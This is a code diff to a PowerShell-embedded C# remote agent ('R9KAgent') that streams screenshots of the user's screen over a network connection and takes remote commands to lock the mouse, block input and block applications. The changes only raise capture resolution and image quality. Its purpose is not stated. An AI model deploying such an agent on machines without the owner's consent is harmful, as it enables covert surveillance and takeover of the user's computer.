@@ -235,13 +235,18 @@ if (-not ("R9KAgent" -as [type])) {
         static ImageCodecInfo jpgCodec = null;
         static EncoderParameters jpgParams = null;
         static string lastClipboardText = "";
+        static long lastQuality = -1;
 
         static void EnsureJpegCodec(long quality) {
             if (jpgCodec == null) {
                 ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                 foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
-                jpgParams = new EncoderParameters(1);
+            }
+            if (jpgParams == null) { jpgParams = new EncoderParameters(1); }
+            if (lastQuality != quality) {
+                if (jpgParams.Param[0] != null) jpgParams.Param[0].Dispose();
                 jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
+                lastQuality = quality;
             }
         }
 
@@ -439,7 +444,8 @@ if (-not ("R9KAgent" -as [type])) {
             while (myClient.Connected) {
                 try {
                     if (streaming) {
-                        string b64 = CaptureScreen(1280, 40);
+                        // ALTERADO AQUI: 1920 de largura e qualidade 80 para Full HD sem pixelar
+                        string b64 = CaptureScreen(1920, 80); 
                         if (b64 != null) { lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); } Thread.Sleep(30); }
                         else Thread.Sleep(100);
                     } else Thread.Sleep(50);
@@ -730,7 +736,7 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "unblock_apps") { UnblockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); } return; }
                 if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                 if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
-                if (cmd == "screenshot") { string s = CaptureScreen(1920, 85); if (s != null) { lock(writeLock) { myWriter.WriteLine("SCREEN:" + s); } } return; }
+                if (cmd == "screenshot") { string s = CaptureScreen(1920, 90); if (s != null) { lock(writeLock) { myWriter.WriteLine("SCREEN:" + s); } } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
@@ -816,7 +822,8 @@ if (-not ("R9KAgent" -as [type])) {
                         int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                         finalBmp = new Bitmap(newW, newH);
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
-                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
+                            // ALTERADO AQUI: Melhor interpolação para não pixelar na redução
+                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                             g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                         }
                     }
